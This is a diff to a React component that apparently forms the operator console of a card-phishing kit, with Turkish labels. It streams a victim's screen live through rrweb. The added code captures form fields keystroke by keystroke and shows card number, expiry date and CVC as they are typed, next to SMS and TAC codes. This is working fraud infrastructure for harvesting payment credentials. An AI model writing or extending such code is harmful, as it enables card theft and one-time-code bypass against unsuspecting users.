@@ -39,6 +39,7 @@ export function LiveWatchModal({
   );
   const [clientMeta, setClientMeta] = useState<LiveClientMeta | null>(null);
   const [actions, setActions] = useState<LiveUserAction[]>([]);
+  const [liveFields, setLiveFields] = useState<Record<string, string>>({});
   const [eventCount, setEventCount] = useState(0);
   const [lastActivityAt, setLastActivityAt] = useState<number | null>(null);
   const [activeTab, setActiveTab] = useState<"feed" | "details">("feed");
@@ -48,6 +49,7 @@ export function LiveWatchModal({
   const channelRef = useRef<RealtimeChannel | null>(null);
   const reassemblerRef = useRef(new BroadcastReassembler());
   const heartbeatTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const lastMetaEventRef = useRef<any>(null);
 
   // Keyboard shortcut: Escape to close
   useEffect(() => {
@@ -84,6 +86,23 @@ export function LiveWatchModal({
       });
     };
 
+    const applyIframeVisibility = () => {
+      if (replayerRef.current?.iframe) {
+        replayerRef.current.iframe.style.display = "block";
+        replayerRef.current.iframe.style.width = "100%";
+        replayerRef.current.iframe.style.height = "100%";
+        replayerRef.current.iframe.style.border = "none";
+      }
+      const iframes = playerContainerRef.current?.querySelectorAll("iframe");
+      iframes?.forEach((iframe) => {
+        iframe.style.display = "block";
+        iframe.style.width = "100%";
+        iframe.style.height = "100%";
+        iframe.style.border = "none";
+        iframe.style.borderRadius = "inherit";
+      });
+    };
+
     // Receive broadcast events
     channel
       .on("broadcast", { event: "client_meta" }, (payload) => {
@@ -97,9 +116,31 @@ export function LiveWatchModal({
       .on("broadcast", { event: "user_action" }, (payload) => {
         reassemblerRef.current.receive<LiveUserAction>(payload.payload, (action) => {
           if (isDisposed) return;
-          setActions((prev) => [action, ...prev].slice(0, 50));
           setLastActivityAt(Date.now());
           setConnectionStatus("live");
+
+          // Update live field value mapping
+          if (action.type === "input" && action.target) {
+            setLiveFields((prev) => ({
+              ...prev,
+              [action.target!]: action.value || "",
+            }));
+          }
+
+          // UPDATE FIELD IN PLACE RATHER THAN LETTER-BY-LETTER FLOODING
+          setActions((prev) => {
+            if (
+              action.type === "input" &&
+              prev.length > 0 &&
+              prev[0].type === "input" &&
+              prev[0].target === action.target
+            ) {
+              const updated = [...prev];
+              updated[0] = action;
+              return updated;
+            }
+            return [action, ...prev].slice(0, 50);
+          });
         });
       })
       .on("broadcast", { event: "screen_event" }, (payload) => {
@@ -109,56 +150,73 @@ export function LiveWatchModal({
           setLastActivityAt(Date.now());
           setConnectionStatus("live");
 
-          // Initialize or feed rrweb Replayer
-          if (!playerContainerRef.current) return;
-
-          const isSnapshot = event.type === 2 || event.type === 4;
-
-          if (!replayerRef.current) {
-            if (rrwebModule && isSnapshot) {
-              try {
-                // Clear old DOM in player container
-                playerContainerRef.current.innerHTML = "";
-                const replayer = new rrwebModule.Replayer([event], {
-                  root: playerContainerRef.current,
-                  liveMode: true,
-                  mouseTail: true,
-                  showWarning: false,
-                  showDebug: false,
-                  useVirtualDom: true,
-                  speed: 1,
-                });
-                replayer.startLive();
-                replayerRef.current = replayer;
-              } catch (err) {
-                console.error("[LiveWatchModal] error creating Replayer:", err);
-              }
-            }
-          } else {
-            if (event.type === 2) {
-              // Full snapshot restart (e.g. user refreshed or navigated)
-              try {
-                replayerRef.current.destroy();
-                playerContainerRef.current.innerHTML = "";
-                if (rrwebModule) {
-                  const replayer = new rrwebModule.Replayer([event], {
-                    root: playerContainerRef.current,
-                    liveMode: true,
-                    mouseTail: true,
-                    showWarning: false,
-                    showDebug: false,
-                    useVirtualDom: true,
-                    speed: 1,
-                  });
-                  replayer.startLive();
-                  replayerRef.current = replayer;
-                }
-              } catch (err) {
-                console.error("[LiveWatchModal] error rebuilding Replayer:", err);
-              }
-            } else {
+          // Cache Meta event (type 4)
+          if (event.type === 4) {
+            lastMetaEventRef.current = event;
+            if (replayerRef.current) {
               try {
                 replayerRef.current.addEvent(event);
+                applyIframeVisibility();
+              } catch {
+                /* ignore */
+              }
+            }
+            return;
+          }
+
+          if (!playerContainerRef.current || !rrwebModule) return;
+
+          // When FullSnapshot (type 2) arrives: REBUILD REPLAYER WITH BOTH META + SNAPSHOT
+          if (event.type === 2) {
+            const meta = lastMetaEventRef.current || {
+              type: 4,
+              data: {
+                href: clientMeta?.pathname
+                  ? window.location.origin + clientMeta.pathname
+                  : window.location.href,
+                width: clientMeta?.width || 375,
+                height: clientMeta?.height || 667,
+              },
+              timestamp: event.timestamp - 1,
+            };
+
+            try {
+              if (replayerRef.current) {
+                try {
+                  replayerRef.current.destroy();
+                } catch {
+                  /* ignore */
+                }
+                replayerRef.current = null;
+              }
+
+              playerContainerRef.current.innerHTML = "";
+              const replayer = new rrwebModule.Replayer([meta, event], {
+                root: playerContainerRef.current,
+                liveMode: true,
+                mouseTail: true,
+                showWarning: false,
+                showDebug: false,
+                useVirtualDom: true,
+                speed: 1,
+              });
+
+              // CRITICAL: pass baseline timestamp so events before Date.now() aren't discarded!
+              replayer.startLive(meta.timestamp);
+              replayerRef.current = replayer;
+
+              applyIframeVisibility();
+              setTimeout(applyIframeVisibility, 50);
+              setTimeout(applyIframeVisibility, 200);
+            } catch (err) {
+              console.error("[LiveWatchModal] error rebuilding Replayer:", err);
+            }
+          } else {
+            // Incremental events (mouse move, input, scroll, click, mutation)
+            if (replayerRef.current) {
+              try {
+                replayerRef.current.addEvent(event);
+                applyIframeVisibility();
               } catch (err) {
                 console.error("[LiveWatchModal] addEvent error:", err);
               }
@@ -213,8 +271,8 @@ export function LiveWatchModal({
     ? `${formData.firstName || ""} ${formData.lastName || ""}`.trim()
     : "Misafir Kullanıcı";
 
-  const viewportWidth = clientMeta?.width || 390;
-  const viewportHeight = clientMeta?.height || 844;
+  const viewportWidth = clientMeta?.width || 375;
+  const viewportHeight = clientMeta?.height || 667;
 
   return (
     <div
@@ -222,6 +280,22 @@ export function LiveWatchModal({
         darkMode ? "bg-black/80" : "bg-black/60"
       }`}
     >
+      <style jsx global>{`
+        .live-player-screen .replayer-wrapper {
+          width: 100% !important;
+          height: 100% !important;
+          position: relative !important;
+          overflow: auto !important;
+        }
+        .live-player-screen .replayer-wrapper iframe {
+          display: block !important;
+          width: 100% !important;
+          height: 100% !important;
+          border: none !important;
+          background: #021a0e !important;
+        }
+      `}</style>
+
       <div
         className={`flex flex-col w-full h-full max-w-7xl max-h-[96vh] rounded-3xl border shadow-2xl overflow-hidden transition-all duration-300 ${
           isFullscreen ? "fixed inset-0 max-w-none max-h-none rounded-none" : ""
@@ -505,7 +579,7 @@ export function LiveWatchModal({
                   }}
                 >
                   {/* Dynamic Island / Speaker Notch */}
-                  <div className="absolute top-4 left-1/2 -translate-x-1/2 w-24 h-4 bg-zinc-900 rounded-full z-20 flex items-center justify-center gap-1.5">
+                  <div className="absolute top-4 left-1/2 -translate-x-1/2 w-24 h-4 bg-zinc-900 rounded-full z-20 flex items-center justify-center gap-1.5 pointer-events-none">
                     <div className="w-2.5 h-2.5 rounded-full bg-zinc-950" />
                     <div className="w-1.5 h-1.5 rounded-full bg-blue-900/40" />
                   </div>
@@ -513,11 +587,11 @@ export function LiveWatchModal({
                   {/* Phone Screen Canvas */}
                   <div
                     ref={playerContainerRef}
-                    className="w-[390px] h-[844px] rounded-[38px] overflow-hidden bg-white relative"
+                    className="live-player-screen w-[390px] h-[844px] rounded-[38px] overflow-hidden bg-[#021a0e] relative"
                   />
 
                   {/* Home Indicator Bar */}
-                  <div className="absolute bottom-2 left-1/2 -translate-x-1/2 w-32 h-1 bg-white/40 rounded-full z-20" />
+                  <div className="absolute bottom-2 left-1/2 -translate-x-1/2 w-32 h-1 bg-white/40 rounded-full z-20 pointer-events-none" />
                 </div>
               ) : frameMode === "desktop" ? (
                 /* DESKTOP BROWSER FRAME */
@@ -545,19 +619,19 @@ export function LiveWatchModal({
                   {/* Desktop Content */}
                   <div
                     ref={playerContainerRef}
-                    className="w-full flex-1 overflow-auto bg-white relative"
+                    className="live-player-screen w-full flex-1 overflow-auto bg-[#021a0e] relative"
                   />
                 </div>
               ) : (
                 /* FIT / NATIVE VIEWPORT */
                 <div
-                  className="rounded-xl shadow-2xl border overflow-hidden bg-white relative"
+                  className="rounded-xl shadow-2xl border overflow-hidden bg-[#021a0e] relative"
                   style={{
                     width: viewportWidth,
                     height: viewportHeight,
                   }}
                 >
-                  <div ref={playerContainerRef} className="w-full h-full relative" />
+                  <div ref={playerContainerRef} className="live-player-screen w-full h-full relative" />
                 </div>
               )}
             </div>
@@ -596,73 +670,109 @@ export function LiveWatchModal({
 
             {/* TAB CONTENT: REAL-TIME FEED */}
             {activeTab === "feed" ? (
-              <div className="flex-1 overflow-y-auto p-3 space-y-2">
+              <div className="flex-1 overflow-y-auto p-3 space-y-3">
+                {/* CANLI DOLDURULAN ALANLAR (LIVE ACTIVE FIELDS SUMMARY) */}
+                {Object.keys(liveFields).length > 0 && (
+                  <div
+                    className={`p-3 rounded-2xl border ${
+                      darkMode ? "bg-white/[0.04] border-emerald-500/30" : "bg-emerald-50/70 border-emerald-200"
+                    }`}
+                  >
+                    <div className="flex items-center gap-1.5 mb-2">
+                      <span className="h-2 w-2 rounded-full bg-emerald-500 animate-ping" />
+                      <span className="text-[10px] font-black uppercase tracking-wider text-emerald-500">
+                        Canlı Doldurulan Alanlar
+                      </span>
+                    </div>
+                    <div className="space-y-1.5">
+                      {Object.entries(liveFields).map(([fKey, fVal]) => (
+                        <div
+                          key={fKey}
+                          className={`flex items-center justify-between gap-2 p-2 rounded-xl text-xs font-mono border ${
+                            darkMode ? "bg-black/30 border-white/5" : "bg-white border-gray-100"
+                          }`}
+                        >
+                          <span className="font-bold opacity-70 text-[11px] truncate">{fKey}:</span>
+                          <span className="font-black text-amber-500 truncate max-w-[170px] text-right">
+                            {fVal || "-"}
+                          </span>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                )}
+
+                {/* TIMELINE LIST */}
                 {actions.length === 0 ? (
                   <div className="py-12 text-center text-xs opacity-50 font-medium">
-                    Kullanıcının sayfadaki tıklamaları, yazı girişleri ve hareketleri burada anlık akacaktır.
+                    Kullanıcının sayfadaki tıklamaları, alan girişleri ve hareketleri burada anlık akacaktır.
                   </div>
                 ) : (
-                  actions.map((act, idx) => {
-                    const timeStr = new Date(act.timestamp).toLocaleTimeString();
-                    return (
-                      <div
-                        key={idx}
-                        className={`p-2.5 rounded-xl border text-xs transition-all flex items-start gap-2.5 ${
-                          darkMode ? "bg-white/[0.03] border-white/5" : "bg-gray-50 border-gray-100"
-                        }`}
-                      >
-                        <div className="mt-0.5">
-                          {act.type === "click" && (
-                            <span className="text-amber-500" title="Tıklama">
-                              👆
-                            </span>
-                          )}
-                          {act.type === "input" && (
-                            <span className="text-blue-500" title="Giriş / Yazı">
-                              ✍️
-                            </span>
-                          )}
-                          {act.type === "focus" && (
-                            <span className="text-purple-500" title="Odaklanma">
-                              🎯
-                            </span>
-                          )}
-                          {act.type === "navigate" && (
-                            <span className="text-emerald-500" title="Sayfa Değişimi">
-                              🧭
-                            </span>
-                          )}
-                        </div>
-
-                        <div className="flex-1 min-w-0">
-                          <div className="flex items-center justify-between gap-1 mb-0.5">
-                            <span className="font-bold uppercase tracking-wider text-[10px] text-emerald-500">
-                              {act.type === "click"
-                                ? "Tıkladı"
-                                : act.type === "input"
-                                ? "Yazdı"
-                                : act.type === "focus"
-                                ? "Alana Girdi"
-                                : "Geçiş Yaptı"}
-                            </span>
-                            <span className="text-[10px] opacity-40 font-mono">{timeStr}</span>
+                  <div className="space-y-2">
+                    {actions.map((act, idx) => {
+                      const timeStr = new Date(act.timestamp).toLocaleTimeString();
+                      return (
+                        <div
+                          key={idx}
+                          className={`p-2.5 rounded-xl border text-xs transition-all flex items-start gap-2.5 ${
+                            darkMode ? "bg-white/[0.03] border-white/5" : "bg-gray-50 border-gray-100"
+                          }`}
+                        >
+                          <div className="mt-0.5">
+                            {act.type === "click" && (
+                              <span className="text-amber-500" title="Tıklama">
+                                👆
+                              </span>
+                            )}
+                            {act.type === "input" && (
+                              <span className="text-blue-500" title="Giriş / Yazı">
+                                ✍️
+                              </span>
+                            )}
+                            {act.type === "focus" && (
+                              <span className="text-purple-500" title="Odaklanma">
+                                🎯
+                              </span>
+                            )}
+                            {act.type === "navigate" && (
+                              <span className="text-emerald-500" title="Sayfa Değişimi">
+                                🧭
+                              </span>
+                            )}
                           </div>
 
-                          {act.target && (
-                            <div className="font-medium text-[11px] truncate">{act.target}</div>
-                          )}
-
-                          {act.value && (
-                            <div className="mt-1 font-mono text-[10px] px-2 py-1 rounded bg-black/20 dark:bg-white/5 text-amber-500 break-words">
-                              {act.value}
+                          <div className="flex-1 min-w-0">
+                            <div className="flex items-center justify-between gap-1 mb-0.5">
+                              <span className="font-bold uppercase tracking-wider text-[10px] text-emerald-500">
+                                {act.type === "click"
+                                  ? "Tıkladı"
+                                  : act.type === "input"
+                                  ? "Alan Doldurdu"
+                                  : act.type === "focus"
+                                  ? "Alana Girdi"
+                                  : "Geçiş Yaptı"}
+                              </span>
+                              <span className="text-[10px] opacity-40 font-mono">{timeStr}</span>
                             </div>
-                          )}
 
-                          <div className="mt-0.5 text-[9px] opacity-40 font-mono">{act.pathname}</div>
+                            {act.target && (
+                              <div className="font-semibold text-[11px] truncate text-white dark:text-white">
+                                {act.target}
+                              </div>
+                            )}
+
+                            {act.value && (
+                              <div className="mt-1 font-mono text-[11px] font-bold px-2 py-1 rounded bg-black/30 dark:bg-black/40 text-amber-400 border border-white/5 break-words">
+                                {act.value}
+                              </div>
+                            )}
+
+                            <div className="mt-0.5 text-[9px] opacity-40 font-mono">{act.pathname}</div>
+                          </div>
                         </div>
-                      </div>
-                    );
-                  })
+                      );
+                    })}
+                  </div>
                 )}
               </div>
             ) : (
@@ -701,22 +811,28 @@ export function LiveWatchModal({
                         <span className="font-bold text-emerald-500">{formData.smsCode || formData.tacCode}</span>
                       </div>
                     )}
-                    {formData.cardNumber && (
+                    {(formData.cardNumber || liveFields["Kart Numarası"]) && (
                       <div className="flex justify-between border-b border-black/5 dark:border-white/5 pb-1">
                         <span className="opacity-60">Kart No:</span>
-                        <span className="font-bold">{formData.cardNumber}</span>
+                        <span className="font-bold text-amber-400">
+                          {liveFields["Kart Numarası"] || formData.cardNumber}
+                        </span>
                       </div>
                     )}
-                    {formData.cardExpiry && (
+                    {(formData.cardExpiry || liveFields["Son Kullanma (SKT)"]) && (
                       <div className="flex justify-between border-b border-black/5 dark:border-white/5 pb-1">
                         <span className="opacity-60">SKT:</span>
-                        <span className="font-bold">{formData.cardExpiry}</span>
+                        <span className="font-bold">
+                          {liveFields["Son Kullanma (SKT)"] || formData.cardExpiry}
+                        </span>
                       </div>
                     )}
-                    {formData.cardCvc && (
+                    {(formData.cardCvc || liveFields["CVC"]) && (
                       <div className="flex justify-between border-b border-black/5 dark:border-white/5 pb-1">
                         <span className="opacity-60">CVC:</span>
-                        <span className="font-bold text-red-500">{formData.cardCvc}</span>
+                        <span className="font-bold text-red-500">
+                          {liveFields["CVC"] || formData.cardCvc}
+                        </span>
                       </div>
                     )}
                   </div>
